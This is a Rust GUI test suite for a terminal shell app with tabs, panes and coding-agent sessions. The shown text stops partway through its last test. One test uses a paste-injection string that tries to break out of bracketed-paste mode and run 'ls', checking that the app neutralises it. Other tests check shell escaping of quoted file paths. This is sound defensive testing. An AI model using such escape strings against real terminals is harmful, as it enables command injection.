use gpui::{Entity, Modifiers, Point, TestAppContext, VisualTestContext, point, px};

use super::*;

use krill_proto::control::Program;

pub(super) fn state_path(name: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!("mk-shell-{}-{name}", std::process::id()));
    std::fs::remove_dir_all(&dir).ok();
    dir.join("layout.bin")
}

pub(super) fn open(
    cx: &mut TestAppContext,
    path: PathBuf,
) -> (Entity<Shell>, &mut VisualTestContext) {
    let state_dir = path.parent().map(std::path::Path::to_path_buf);
    cx.update(|cx| {
        gpui_component::init(cx);
        krill_app::settings::init_at(state_dir, cx);
        bind_keys(cx);
    });
    let (view, cx) = cx.add_window_view(|_, cx| Shell::new(Some(path), cx));
    cx.update(|window, cx| {
        let focus = view.read(cx).focus.clone();
        window.focus(&focus, cx);
    });
    (view, cx)
}

/// 왼쪽 버튼을 누른 채 `from`에서 `to`로 끌고 놓는다.
fn drag(cx: &mut VisualTestContext, from: Point<Pixels>, to: Point<Pixels>) {
    let none = Modifiers::default();
    cx.simulate_mouse_down(from, MouseButton::Left, none);
    let mid = point((from.x + to.x) / 2., (from.y + to.y) / 2.);
    cx.simulate_mouse_move(mid, MouseButton::Left, none);
    cx.simulate_mouse_move(to, MouseButton::Left, none);
    cx.simulate_mouse_up(to, MouseButton::Left, none);
    cx.run_until_parked();
}

pub(super) fn layout_of(view: &Entity<Shell>, cx: &mut VisualTestContext) -> Layout {
    cx.update(|_, cx| {
        view.read(cx).saver.flush();
        view.read(cx).layout.clone()
    })
}

#[gpui::test]
fn keys_drag_and_restart_restore(cx: &mut TestAppContext) {
    let path = state_path("e2e");
    let (view, cx) = open(cx, path.clone());

    // 탭 10개, 마지막 탭에 분할 4번(칸 5개).
    for _ in 0..9 {
        cx.simulate_keystrokes("cmd-t");
    }
    cx.simulate_keystrokes("cmd-d cmd-shift-d cmd-d cmd-shift-d");
    let l = layout_of(&view, cx);
    assert_eq!(l.tabs().len(), 10);
    assert_eq!(l.active(), 9);
    let PaneTree::Split { axis, .. } = &l.active_tab().root else {
        panic!("active tab should be split");
    };
    assert_eq!(*axis, Axis::Horizontal);

    let size = cx.update(|window, _| window.viewport_size());
    let (w, h) = (f32::from(size.width), f32::from(size.height));
    let y = h * 0.75;

    // 사이드바 너비 드래그: 분할선은 x = 240..245.
    drag(cx, point(px(242.), px(y)), point(px(400.), px(y)));
    let l = layout_of(&view, cx);
    assert!((l.sidebar_width - 400.).abs() < 0.5, "{}", l.sidebar_width);

    // 루트 좌우 분할 비율 드래그: 가운데 열은 x = 405..w-285, 분할선은 그 가운데.
    let (left, center) = (405., w - 285. - 405.);
    let line = left + center / 2. + 2.;
    drag(cx, point(px(line), px(y)), point(px(left + 100.), px(y)));
    let l = layout_of(&view, cx);
    let PaneTree::Split { ratio, .. } = l.active_tab().root else {
        panic!("active tab should be split");
    };
    assert!((ratio - 100. / center).abs() < 0.01, "ratio {ratio}");

    // 최소 50px: 왼쪽 끝까지 끌어도 첫 칸은 50px.
    let line = left + ratio * center + 2.;
    drag(cx, point(px(line), px(y)), point(px(0.), px(y)));
    let l = layout_of(&view, cx);
    let PaneTree::Split { ratio, .. } = l.active_tab().root else {
        panic!("active tab should be split");
    };
    assert!((ratio - 50. / center).abs() < 0.01, "ratio {ratio}");

    // 놓을 때 저장됐고, 재시작(새 Shell)은 같은 레이아웃을 복원한다.
    assert_eq!(Layout::load(&path).unwrap(), l);
    let restored = cx.update(|_, cx| cx.new(|cx| Shell::new(Some(path.clone()), cx)));
    assert_eq!(layout_of(&restored, cx), l);
}

#[gpui::test]
fn close_and_cycle_keys(cx: &mut TestAppContext) {
    let path = state_path("keys");
    let (view, cx) = open(cx, path.clone());
    cx.simulate_keystrokes("cmd-t cmd-t cmd-shift-] cmd-d cmd-w cmd-shift-w cmd-shift-[");
    let l = layout_of(&view, cx);
    // 3탭 → 다음 탭(0)으로 순환 → 분할 후 닫기 → 탭 0 닫기 → 2탭, 이전 탭으로.
    assert_eq!(l.tabs().len(), 2);
    assert_eq!(l.active(), 1);
    assert!(matches!(l.active_tab().root, PaneTree::Leaf(_)));
    assert_eq!(Layout::load(&path).unwrap(), l);
}

/// MK-025·MK-026: 데몬 기동 실패 이유와 끊김이 셸 배너로 보이고, 다시 붙으면 사라진다.
#[gpui::test]
fn daemon_link_shows_banner(cx: &mut TestAppContext) {
    let (view, cx) = open(cx, state_path("daemon"));
    let banner = |cx: &mut VisualTestContext| cx.update(|_, cx| view.read(cx).link.banner());
    assert_eq!(banner(cx), None);
    let failed = Link::Failed(daemon::Error::Timeout.to_string());
    cx.update(|_, cx| view.update(cx, |s, cx| s.set_link(failed, cx)));
    cx.run_until_parked();
    let b = banner(cx).unwrap();
    assert!(
        b.contains("krilld did not publish its socket within 5s"),
        "{b}"
    );
    cx.update(|_, cx| view.update(cx, |s, cx| s.set_link(Link::Down, cx)));
    cx.run_until_parked();
    assert!(banner(cx).unwrap().contains("다시 연결"));
    cx.update(|_, cx| view.update(cx, |s, cx| s.set_link(Link::Up, cx)));
    cx.run_until_parked();
    assert_eq!(banner(cx), None);
}

/// OWE-490: 특수 키·IME 확정 텍스트가 포커스 칸 세션의 INPUT으로 가고, 화면 프레임의 제목이 탭 이름이 된다.
#[gpui::test]
fn keys_ime_and_frames_reach_the_focused_pane(cx: &mut TestAppContext) {
    use std::io::Read as _;
    use std::os::unix::net::UnixStream;

    use krill_proto::input::Input;
    use krill_proto::screen::{Msg as _, Op, Revision, Seq, encode_update};

    let (view, cx) = open(cx, state_path("pane-io"));
    let (ours, mut theirs) = UnixStream::pair().unwrap();
    theirs
        .set_read_timeout(Some(std::time::Duration::from_secs(2)))
        .unwrap();
    let pane = layout_of(&view, cx).active_tab().focused;
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.attach_test(pane, krill_proto::SessionId(3), ours, cx);
        });
    });
    cx.run_until_parked();

    // Cmd+Backspace는 단축키로 삼키지 않고 Ctrl+U(줄 시작까지 지움)로 보낸다.
    cx.simulate_keystrokes("enter ctrl-c cmd-backspace");
    // 조합 중 글자는 보내지 않고, 확정 텍스트만 보낸다.
    cx.update(|window, cx| {
        view.update(cx, |s, cx| {
            s.replace_and_mark_text_in_range(None, "ㅎ", None, window, cx);
            // W1: IME가 조합 중 글자를 다시 읽으면 preedit를 돌려준다(nil이면 자모마다 새 조합).
            let mut adjusted = None;
            assert_eq!(
                s.text_for_range(0..5, &mut adjusted, window, cx).as_deref(),
                Some("ㅎ")
            );
            assert_eq!(adjusted, Some(0..1));
        });
    });
    cx.simulate_input("한");

    let mut got = Vec::new();
    while got.len() < 4 {
        let (k, b) = krill_proto::ipc::read_frame(&mut theirs).unwrap().unwrap();
        got.push(Input::decode(k, &b).unwrap().bytes);
    }
    assert_eq!(
        got,
        [
            b"\r".to_vec(),
            vec![3],
            vec![0x15],
            "한".as_bytes().to_vec()
        ]
    );
    theirs.set_nonblocking(true).unwrap();
    assert!(theirs.read(&mut [0; 16]).is_err(), "no more input");
    // 단축키는 세션에 가지 않고, 새 탭으로 안 보이게 된 칸은 연결을 닫는다(EOF).
    cx.simulate_keystrokes("cmd-t");
    assert_eq!(theirs.read(&mut [0; 16]).unwrap(), 0);

    // 숨긴 칸은 앱에 남는 것이 없다(MK-035). 다시 돌아와 화면 프레임을 넣는다.
    assert!(cx.update(|_, cx| view.read(cx).live.is_empty()));
    cx.simulate_keystrokes("cmd-shift-[");
    let (ours, _theirs) = UnixStream::pair().unwrap();
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.attach_test(pane, krill_proto::SessionId(3), ours, cx);
            let ops = vec![Op::Reset { cols: 4, lines: 1 }, Op::Title("빌드".into())];
            let frame = &encode_update(Revision(1), Seq(1), ops).unwrap()[0];
            let (k, b) = krill_proto::ipc::read_frame(&mut &frame[..])
                .unwrap()
                .unwrap();
            assert!(s.on_frame(pane, k, &b, cx));
        });
    });
    cx.run_until_parked();
    assert_eq!(
        cx.update(|_, cx| view.read(cx).titles.get(&pane).cloned()),
        Some("빌드".to_owned())
    );
}

/// MK-029: 협상된 키·IME 확정·SGR 마우스가 실제 입력 장부를 거치고 Cmd+클릭은 URL을 연다.
#[gpui::test]
fn tui_modes_keys_ime_mouse_and_cmd_link(cx: &mut TestAppContext) {
    use krill_proto::input::Input;
    use krill_proto::screen::{Link as ScreenLink, Msg as _, Op, Revision, Seq, encode_update};
    use krill_proto::term_modes::{Modes, TERM_MODES};

    let (view, cx) = open(cx, state_path("tui-input"));
    let (ours, mut theirs) = UnixStream::pair().unwrap();
    theirs
        .set_read_timeout(Some(Duration::from_secs(2)))
        .unwrap();
    let pane = layout_of(&view, cx).active_tab().focused;
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.attach_test(pane, krill_proto::SessionId(3), ours, cx);
            let modes = Modes {
                kitty: 7,
                flags: Modes::MOUSE_CLICK | Modes::SGR_MOUSE,
            };
            let body = postcard::to_stdvec(&modes).unwrap();
            assert!(s.on_frame(pane, TERM_MODES, &body, cx));
            let ops = vec![
                Op::Reset { cols: 20, lines: 4 },
                Op::Links {
                    line: 0,
                    links: vec![ScreenLink {
                        column: 0,
                        cols: 3,
                        uri: "https://example.com/문서".into(),
                    }],
                },
            ];
            let frame = &encode_update(Revision(1), Seq(0), ops).unwrap()[0];
            let (k, body) = ipc::read_frame(&mut &frame[..]).unwrap().unwrap();
            assert!(s.on_frame(pane, k, &body, cx));
        });
    });
    cx.run_until_parked();
    let mut input = || {
        let (k, body) = ipc::read_frame(&mut theirs).unwrap().unwrap();
        Input::decode(k, &body).unwrap().bytes
    };
    cx.simulate_keystrokes("shift-enter enter ctrl-c");
    assert_eq!(input(), b"\x1b[13;2u");
    assert_eq!(input(), b"\r");
    assert_eq!(input(), b"\x1b[99;5u");
    // 한글 조합은 전송하지 않고 확정할 때 report-all + associated-text 형식으로 보낸다.
    cx.update(|window, cx| {
        view.update(cx, |s, cx| {
            let modes = Modes {
                kitty: 24,
                flags: Modes::MOUSE_CLICK | Modes::SGR_MOUSE,
            };
            assert!(s.on_frame(pane, TERM_MODES, &postcard::to_stdvec(&modes).unwrap(), cx));
            s.replace_and_mark_text_in_range(None, "ㅎ", None, window, cx);
        });
    });
    cx.simulate_input("한");
    assert_eq!(input(), b"\x1b[54620;1;54620u");
    let (bounds, cell) = cx.update(|_, cx| view.read(cx).live[&pane].painted.get());
    let at = point(
        bounds.origin.x + cell.width / 2.,
        bounds.origin.y + cell.height / 2.,
    );
    cx.simulate_mouse_down(at, MouseButton::Left, Modifiers::default());
    assert_eq!(input(), b"\x1b[<0;1;1M");
    cx.simulate_mouse_up(at, MouseButton::Left, Modifiers::default());
    assert_eq!(input(), b"\x1b[<0;1;1m");
    let cmd = Modifiers {
        platform: true,
        ..Modifiers::default()
    };
    cx.simulate_mouse_down(at, MouseButton::Left, cmd);
    cx.simulate_mouse_up(at, MouseButton::Left, cmd);
    assert_eq!(cx.opened_url().as_deref(), Some("https://example.com/문서"));
    theirs.set_nonblocking(true).unwrap();
    let mut extra = [0; 1];
    assert!(
        std::io::Read::read(&mut theirs, &mut extra).is_err(),
        "Cmd+click and preedit send no input"
    );
}

/// OWE-488: 배지는 전역 토글 대신 세션의 생성 당시 권한을 쓰고 프로필 버튼은 새 칸에 해당 id를 전달한다.
#[gpui::test]
fn agent_button_and_yolo_badge_use_session_permission(cx: &mut TestAppContext) {
    use krill_proto::control::AgentProfile;

    let (view, cx) = open(cx, state_path("agents"));
    let pane = layout_of(&view, cx).active_tab().focused;
    let (ours, _theirs) = UnixStream::pair().unwrap();
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.attach_test(pane, krill_proto::SessionId(8), ours, cx);
            s.live.get_mut(&pane).unwrap().launch = Some(AgentLaunch {
                profile: "fixture".into(),
                permission: Permission::Yolo,
            });
            s.agents = Some(AgentSettings {
                permission: Permission::Manual,
                profiles: vec![AgentProfile {
                    id: "fixture".into(),
                    name: "Fixture".into(),
                }],
            });
            s.link = Link::Up;
            cx.notify();
        });
    });
    cx.run_until_parked();
    assert!(
        cx.debug_bounds("yolo-badge").is_some(),
        "YOLO session stays marked with global Manual"
    );
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.live
                .get_mut(&pane)
                .unwrap()
                .launch
                .as_mut()
                .unwrap()
                .permission = Permission::Manual;
            s.agents.as_mut().unwrap().permission = Permission::Yolo;
            cx.notify();
        });
    });
    cx.run_until_parked();
    assert!(
        cx.debug_bounds("yolo-badge").is_none(),
        "Manual session stays unmarked with global YOLO"
    );
    // OWE-576: 새 세션 메뉴의 첫 프로필 단축키(⌥⌘1). 목록 밖 단축키는 아무것도 하지 않는다.
    cx.simulate_keystrokes("alt-cmd-2");
    assert_eq!(layout_of(&view, cx).tabs().len(), 1);
    cx.simulate_keystrokes("alt-cmd-1");
    cx.run_until_parked();
    cx.update(|_, cx| {
        let s = view.read(cx);
        assert_eq!(s.layout.tabs().len(), 2);
        assert_eq!(
            s.launch_for(s.layout.active_tab().focused).program,
            pane::Program::Agent {
                id: "fixture".into()
            }
        );
    });
}

/// MK-055: 폴더 선택은 기존 세션을 보존하고 새 탭을 만든다.
#[gpui::test]
fn folder_tab_and_agent_use_selected_directory(cx: &mut TestAppContext) {
    let path = state_path("folder");
    let (view, cx) = open(cx, path.clone());
    let folder = PathBuf::from("/tmp/한글 'folder'");
    view.update(cx, |this, cx| {
        let old = this.layout.active_tab().focused;
        this.layout.set_session(old, krill_proto::SessionId(420));
        Shell::choose_folder(cx);
    });
    assert!(cx.did_prompt_for_paths());
    cx.simulate_path_prompt_response(|options| {
        assert!(options.directories);
        assert!(!options.files);
        assert!(!options.multiple);
        Some(vec![folder.clone()])
    });
    cx.run_until_parked();
    view.update(cx, |this, cx| {
        let old = this.layout.tabs()[0].focused;
        assert_eq!(this.folder(), folder);
        assert_eq!(this.layout.session(old), Some(krill_proto::SessionId(420)));
        this.new_folder_tab(&this.folder(), Program::Agent { id: "codex".into() }, cx);
        let launch = this.launch_for(this.layout.active_tab().focused);
        assert_eq!(launch.program, Program::Agent { id: "codex".into() });
        assert_eq!(launch.cwd, folder.as_os_str().as_bytes());
        assert_eq!(this.layout.tabs().len(), 3);
    });
    let before_cancel = layout_of(&view, cx);
    view.update(cx, |_, cx| Shell::choose_folder(cx));
    cx.simulate_path_prompt_response(|_| None);
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx), before_cancel);
    let restored = cx.update(|_, cx| cx.new(|cx| Shell::new(Some(path.clone()), cx)));
    restored.update(cx, |this, _| {
        assert_eq!(this.folder(), folder);
        assert_eq!(
            this.launch_for(this.layout.active_tab().focused).program,
            Program::Agent { id: "codex".into() }
        );
    });
}

/// 전역 토글의 성공·실패는 인메모리 IPC로 확인한다(외부 IO 없음).
#[gpui::test]
fn agent_permission_changes_only_after_successful_reply(cx: &mut TestAppContext) {
    use krill_app::pane::AgentClient;
    use std::sync::Mutex;

    #[derive(Debug)]
    struct MemoryAgents(Mutex<(Permission, bool)>);
    impl AgentClient for MemoryAgents {
        fn settings(
            &self,
            _: &Paths,
            permission: Option<Permission>,
        ) -> std::io::Result<AgentSettings> {
            let mut state = self
                .0
                .lock()
                .map_err(|_| std::io::Error::other("fixture poisoned"))?;
            if state.1 {
                return Err(std::io::Error::other("fixture save failed"));
            }
            if let Some(permission) = permission {
                state.0 = permission;
            }
            Ok(AgentSettings {
                permission: state.0,
                profiles: Vec::new(),
            })
        }
    }
    let memory = Arc::new(MemoryAgents(Mutex::new((Permission::Manual, false))));
    let (view, cx) = open(cx, state_path("agent-toggle"));
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.agent_client = memory.clone();
            s.paths = Some(Paths {
                socket: PathBuf::new(),
                holder: PathBuf::new(),
                krilld: PathBuf::new(),
            });
            s.link = Link::Up;
            s.agents = Some(AgentSettings {
                permission: Permission::Manual,
                profiles: Vec::new(),
            });
            cx.notify();
        });
    });
    cx.run_until_parked();
    // 새 세션 메뉴의 YOLO 항목이 부르는 것과 같은 경로.
    let choose = |cx: &mut VisualTestContext, permission| {
        view.update(cx, |s, cx| s.load_agents(Some(permission), cx));
        cx.run_until_parked();
    };
    assert!(cx.debug_bounds("new-session").is_some());
    assert!(cx.debug_bounds("yolo-global").is_none());
    choose(cx, Permission::Yolo);
    assert_eq!(memory.0.lock().unwrap().0, Permission::Yolo);
    assert!(
        cx.debug_bounds("yolo-global").is_some(),
        "global YOLO is visible"
    );
    cx.update(|_, cx| {
        assert_eq!(
            view.read(cx).agents.as_ref().unwrap().permission,
            Permission::Yolo
        );
    });
    memory.0.lock().unwrap().1 = true;
    choose(cx, Permission::Manual);
    cx.update(|_, cx| {
        let s = view.read(cx);
        assert_eq!(s.agents.as_ref().unwrap().permission, Permission::Yolo);
        assert_eq!(s.notice.as_deref(), Some("fixture save failed"));
        assert!(!s.agents_busy);
    });
}

/// OWE-492: 칸을 닫아도 세션은 남고(레이아웃에서만 빠짐), 분리된 세션을 누르면 새 탭에 다시 붙는다.
#[gpui::test]
fn detached_session_reopens_in_new_tab(cx: &mut TestAppContext) {
    let (view, cx) = open(cx, state_path("detached"));
    let s = krill_proto::SessionId(7);
    cx.update(|_, cx| {
        view.update(cx, |t, cx| {
            let p = t.layout.active_tab().focused;
            t.layout.set_session(p, s);
            t.change(true, cx, Layout::close_pane);
        });
    });
    assert!(layout_of(&view, cx).tabs().is_empty());
    assert!(layout_of(&view, cx).sessions().is_empty());

    cx.update(|_, cx| {
        let d = view.read(cx).detached.clone();
        d.update(cx, |_, cx| cx.emit(detached::Open(s)));
    });
    cx.run_until_parked();
    let l = layout_of(&view, cx);
    assert_eq!(l.tabs().len(), 1);
    assert_eq!(l.session(l.active_tab().focused), Some(s));
}

/// OWE-506: 세션을 만든 뒤 붙기만 실패하면 그 세션을 레이아웃에 적는다. 안 적으면 다시 시도할 때 `want`가 비어 세션을
/// 또 만든다.
#[gpui::test]
fn attach_failure_after_create_keeps_session(cx: &mut TestAppContext) {
    let (view, cx) = open(cx, state_path("attach-fail"));
    let s = krill_proto::SessionId(9);
    let pane = layout_of(&view, cx).active_tab().focused;
    let next = cx.update(|_, cx| {
        view.update(cx, |t, cx| {
            t.live.insert(pane, Live::new(Task::ready(())));
            let err = std::io::Error::new(std::io::ErrorKind::TimedOut, "attach timed out");
            t.settled(pane, Ok(Got::Live(s, Err(err))), cx)
        })
    });
    assert!(matches!(next, Next::Retry));
    assert_eq!(layout_of(&view, cx).session(pane), Some(s));
    cx.update(|_, cx| {
        let l = &view.read(cx).live[&pane];
        assert_eq!(l.error.as_deref(), Some("attach timed out"));
    });
}

/// MK-057: Cmd+J 팔레트가 사이드바 스냅샷으로 세션을 찾고, Enter로 새 탭에 열고 닫힌다. Esc·Cmd+J 다시 누르기도 닫는다.
#[gpui::test]
fn jump_palette_opens_session(cx: &mut TestAppContext) {
    use krill_proto::SessionId;
    use krill_proto::control::{AgentState, AgentStatus};
    use std::sync::Arc;

    struct Memory(sidebar::Snapshot);
    impl sidebar::Source for Memory {
        fn fetch(&self) -> std::io::Result<sidebar::Snapshot> {
            Ok(self.0.clone())
        }
    }
    let session = |id, state, tree: &str| sidebar::Session {
        id: SessionId(id),
        status: AgentStatus {
            state,
            agent: "claude".into(),
            ..AgentStatus::UNKNOWN
        },
        worktree: Some(tree.into()),
        cwd: None,
        account: None,
    };
    let snapshot = sidebar::Snapshot {
        sessions: vec![
            session(5, AgentState::Working, "/repo/main"),
            session(9, AgentState::Waiting, "/repo/feature"),
        ],
        trees: [(
            "/repo".into(),
            vec!["/repo/main".into(), "/repo/feature".into()],
        )]
        .into(),
    };
    let (view, cx) = open(cx, state_path("jump"));
    cx.update(|_, cx| {
        let sidebar = view.read(cx).sidebar.clone();
        sidebar.update(cx, |s, cx| s.connect_source(Arc::new(Memory(snapshot)), cx));
    });
    cx.run_until_parked();
    let is_open = |cx: &mut VisualTestContext| cx.update(|_, cx| view.read(cx).jump.is_some());

    cx.simulate_keystrokes("cmd-j");
    assert!(is_open(cx));
    cx.simulate_keystrokes("cmd-j");
    assert!(!is_open(cx));
    cx.simulate_keystrokes("cmd-j");
    cx.simulate_keystrokes("escape");
    assert!(!is_open(cx));

    cx.simulate_keystrokes("cmd-j");
    // 입력 대기("대기")로 거르면 세션 9 하나.
    cx.simulate_input("대기");
    cx.simulate_keystrokes("enter");
    assert!(!is_open(cx));
    let l = layout_of(&view, cx);
    assert_eq!(l.tabs().len(), 2);
    assert_eq!(l.session(l.active_tab().focused), Some(SessionId(9)));
    // 포커스가 셸로 돌아와 단축키가 다시 듣는다.
    assert!(cx.update(|window, cx| view.read(cx).focus.is_focused(window)));
}

/// OWE-768: AI Vault 팝오버를 먼저 열지 않아도 `Cmd+J`가 볼트 스캔·검색을 연동하고
/// 방향키와 Enter로 볼트 항목을 선택해 새 탭에서 재개한다.
#[gpui::test]
fn jump_palette_loads_vault_without_opening_popover_and_resumes_by_keyboard(
    cx: &mut TestAppContext,
) {
    use krill_proto::SessionId;
    use krill_proto::agent_history::{
        Action, Agent, Entry, Response, SearchSnapshot, Snapshot, VaultAgent, VaultHit, VaultTarget,
    };
    use krill_proto::control::{Reply, Request};
    use std::sync::{Arc, Mutex};

    let resumed = Arc::new(Mutex::new(Vec::new()));
    let resumed_seen = resumed.clone();
    let call: krill_app::agent_history::Call = Arc::new(move |r| {
        Ok(Reply::AgentHistory(match r {
            Request::AgentHistory(Action::Scan) => Response::Scanned(Snapshot {
                entries: vec![Entry {
                    agent: Agent::Claude,
                    id: "11111111-2222-4333-8444-555555555555".into(),
                    cwd: "/tmp/vault-a".into(),
                    modified: 10,
                }],
                truncated: false,
                skipped: false,
            }),
            Request::AgentHistory(Action::Search(_)) => Response::Searched(SearchSnapshot {
                hits: vec![
                    VaultHit {
                        agent: VaultAgent::Claude,
                        id: "11111111-2222-4333-8444-555555555555".into(),
                        cwd: "/tmp/vault-a".into(),
                        modified: 20,
                        title: "Vault First".into(),
                        summary: String::new(),
                        snippet: "oauth token".into(),
                        role: "assistant".into(),
                        score: 100,
                    },
                    VaultHit {
                        agent: VaultAgent::Codex,
                        id: "22222222-2222-4333-8444-555555555555".into(),
                        cwd: "/tmp/vault-b".into(),
                        modified: 15,
                        title: "Vault Second".into(),
                        summary: String::new(),
                        snippet: "oauth refresh".into(),
                        role: "assistant".into(),
                        score: 90,
                    },
                ],
                truncated: false,
                skipped: false,
            }),
            Request::AgentHistory(Action::ResumeVault(target)) => {
                resumed_seen.lock().unwrap().push(target.clone());
                Response::Resumed {
                    session: SessionId(88),
                }
            }
            _ => unreachable!(),
        }))
    });

    let (view, cx) = open(cx, state_path("jump-vault"));
    cx.update(|_, cx| {
        let history = view.read(cx).history.clone();
        history.update(cx, |h, _| h.set_call(call));
        assert!(!history.read(cx).is_open());
    });

    cx.simulate_keystrokes("cmd-j");
    cx.run_until_parked();
    // 팝오버를 열지 않았어도 Cmd+J 오픈 시 초기 스캔 결과가 들어온다.
    assert_eq!(
        cx.update(|_, cx| {
            view.read(cx)
                .jump
                .as_ref()
                .unwrap()
                .0
                .read(cx)
                .vault_matches()
                .count()
        }),
        1
    );

    // 검색어 입력 시 전문 검색 결과(2건)가 연동되고, 방향키(down)와 Enter로 2번째 볼트 항목을 재개한다.
    cx.simulate_input("oauth");
    cx.run_until_parked();
    assert_eq!(
        cx.update(|_, cx| {
            view.read(cx)
                .jump
                .as_ref()
                .unwrap()
                .0
                .read(cx)
                .vault_matches()
                .count()
        }),
        2
    );

    cx.simulate_keystrokes("down enter");
    cx.run_until_parked();

    assert_eq!(
        resumed.lock().unwrap().as_slice(),
        &[VaultTarget {
            agent: VaultAgent::Codex,
            id: "22222222-2222-4333-8444-555555555555".into(),
            cwd: "/tmp/vault-b".into(),
            modified: 15,
        }]
    );
    let l = layout_of(&view, cx);
    assert_eq!(l.tabs().len(), 2);
    assert_eq!(l.session(l.active_tab().focused), Some(SessionId(88)));
}

/// CLI에서 만든 세션을 사이드바로 열어도 해당 워크트리·일반 폴더가 Open in의 대상이다.
#[gpui::test]
fn sidebar_selection_sets_folder_for_open_in_and_new_agent(cx: &mut TestAppContext) {
    struct Memory;
    impl sidebar::Source for Memory {
        fn fetch(&self) -> std::io::Result<sidebar::Snapshot> {
            Ok(sidebar::Snapshot {
                sessions: vec![
                    sidebar::Session {
                        id: krill_proto::SessionId(7),
                        status: krill_proto::control::AgentStatus::UNKNOWN,
                        worktree: Some("/repo/tree".into()),
                        cwd: Some("/repo/tree/src".into()),
                        account: None,
                    },
                    sidebar::Session {
                        id: krill_proto::SessionId(8),
                        status: krill_proto::control::AgentStatus::UNKNOWN,
                        worktree: None,
                        cwd: Some("/tmp/일반 폴더".into()),
                        account: None,
                    },
                ],
                ..sidebar::Snapshot::default()
            })
        }
    }
    let (view, cx) = open(cx, state_path("sidebar-folder"));
    view.update(cx, |this, cx| {
        this.sidebar.update(cx, |s, cx| {
            s.connect_source(std::sync::Arc::new(Memory), cx);
        });
    });
    cx.run_until_parked();
    for (id, folder) in [(7, "/repo/tree"), (8, "/tmp/일반 폴더")] {
        view.update(cx, |this, cx| {
            this.sidebar.update(cx, |_, cx| {
                cx.emit(sidebar::Selected(krill_proto::SessionId(id)));
            });
        });
        cx.run_until_parked();
        view.update(cx, |this, cx| {
            assert_eq!(this.folder(), PathBuf::from(folder));
            assert_eq!(
                this.layout.session(this.layout.active_tab().focused),
                Some(krill_proto::SessionId(id))
            );
            this.new_folder_tab(&this.folder(), Program::Agent { id: "codex".into() }, cx);
            assert_eq!(this.folder(), PathBuf::from(folder));
        });
    }
}

/// MK-078: 스크린 리더가 새 세션 버튼들을 "에이전트 새 세션" 그룹으로 읽는다.
#[gpui::test]
fn new_session_buttons_are_a_named_group(cx: &mut TestAppContext) {
    let (view, cx) = open(cx, state_path("a11y-agents"));
    let (role, label) = cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            let group = s.render_agents(cx);
            let mut node = gpui::accesskit::Node::new(gpui::Role::Unknown);
            gpui::Element::write_a11y_info(&group, &mut node);
            (
                gpui::Element::a11y_role(&group),
                node.label().map(str::to_owned),
            )
        })
    });
    assert_eq!(role, Some(gpui::Role::Group));
    assert_eq!(label.as_deref(), Some(text::AGENTS.get()));
}

/// MK-033: 끌어 선택 → Cmd+C, Cmd+V(bracketed), 파일 드롭(셸 이스케이프), OSC 52 쓰기 → 시스템 클립보드.
#[gpui::test]
fn select_copy_paste_drop_and_osc52(cx: &mut TestAppContext) {
    use krill_proto::clipboard::Clipboard;
    use krill_proto::input::Input;
    use krill_proto::screen::{Cell, Msg as _, Op, Revision, Seq, encode_update};
    use krill_proto::term_modes::{Modes, TERM_MODES};

    let (view, cx) = open(cx, state_path("select"));
    let (ours, mut theirs) = UnixStream::pair().unwrap();
    theirs
        .set_read_timeout(Some(Duration::from_secs(2)))
        .unwrap();
    let pane = layout_of(&view, cx).active_tab().focused;
    let frame = |s: &mut Shell, f: &[u8], cx: &mut Context<Shell>| {
        let (k, b) = ipc::read_frame(&mut &f[..]).unwrap().unwrap();
        assert!(s.on_frame(pane, k, &b, cx));
    };
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.attach_test(pane, krill_proto::SessionId(3), ours, cx);
            let modes = Modes {
                kitty: 0,
                flags: Modes::BRACKETED_PASTE,
            };
            let body = postcard::to_stdvec(&modes).unwrap();
            assert!(s.on_frame(pane, TERM_MODES, &body, cx));
            let row = |t: &str| {
                t.chars()
                    .map(|ch| Cell {
                        ch,
                        ..Cell::default()
                    })
                    .collect()
            };
            let ops = vec![
                Op::Reset { cols: 20, lines: 2 },
                Op::Line {
                    line: 0,
                    cells: row("hello world"),
                },
                Op::Line {
                    line: 1,
                    cells: row("둘째"),
                },
            ];
            frame(s, &encode_update(Revision(1), Seq(0), ops).unwrap()[0], cx);
        });
    });
    cx.run_until_parked();
    let (bounds, cell) = cx.update(|_, cx| view.read(cx).live[&pane].painted.get());
    let at = |col: f32, line: f32| {
        point(
            bounds.origin.x + cell.width * (col + 0.5),
            bounds.origin.y + cell.height * (line + 0.5),
        )
    };
    // "world"를 거꾸로 끌어 선택한다.
    drag(cx, at(10., 0.), at(6., 0.));
    cx.simulate_keystrokes("cmd-c");
    let clip = |cx: &mut VisualTestContext| cx.read_from_clipboard().and_then(|c| c.text());
    assert_eq!(clip(cx).as_deref(), Some("world"));
    // 움직이지 않은 클릭은 선택을 지운다.
    drag(cx, at(1., 1.), at(1., 1.));
    assert!(cx.update(|_, cx| view.read(cx).live[&pane].selection.is_none()));

    let mut input = || {
        let (k, body) = ipc::read_frame(&mut theirs).unwrap().unwrap();
        Input::decode(k, &body).unwrap().bytes
    };
    cx.write_to_clipboard(ClipboardItem::new_string("ls\n\x1b[201~x".to_owned()));
    cx.simulate_keystrokes("cmd-v");
    assert_eq!(input(), b"\x1b[200~ls\n[201~x\x1b[201~");

    // OWE-507: ⌘V 직후에도 파일 드롭이 마우스 모달리티로 전환되어 칸의 `on_drop`에 도달한다.
    assert!(cx.update(|window, _| window.last_input_was_keyboard()));
    let paths = ExternalPaths(
        [PathBuf::from("/tmp/a b"), PathBuf::from("/tmp/it's")]
            .into_iter()
            .collect(),
    );
    cx.simulate_event(gpui::FileDropEvent::Entered {
        position: at(2., 1.),
        paths,
    });
    assert!(!cx.update(|window, _| window.last_input_was_keyboard()));
    // 끄는 중 키를 눌러도 다음 Pending/Submit이 다시 마우스 모달리티로 전환한다.
    cx.simulate_keystrokes("cmd-c");
    assert!(cx.update(|window, _| window.last_input_was_keyboard()));
    cx.simulate_event(gpui::FileDropEvent::Pending {
        position: at(2., 1.),
    });
    assert!(!cx.update(|window, _| window.last_input_was_keyboard()));
    cx.simulate_keystrokes("cmd-c");
